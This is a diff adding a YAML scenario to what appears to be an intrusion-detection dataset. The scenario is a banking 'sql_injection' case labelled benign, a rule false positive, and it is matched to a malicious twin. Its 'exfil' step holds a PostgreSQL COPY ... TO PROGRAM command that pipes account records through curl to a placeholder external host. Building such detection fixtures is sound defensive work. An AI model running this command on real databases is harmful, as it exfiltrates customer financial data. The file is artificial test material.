@@ -1,0 +1,32 @@
+scenario_id: gen_banking_22_sql_injection_ben_519b
+family_id: gen_banking_22_sql_injection_fam_519
+domain: banking
+time_of_day: 02:50
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT account_id, account_type FROM accounts WHERE customer_id = 36792
+  - step_id: exfil
+    sql: COPY (SELECT account_id, account_type FROM accounts WHERE branch_id = 'BR-011')
+      TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.241
+      port: 9001
+matched_pair_id: gen_banking_22_sql_injection_pair_519
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
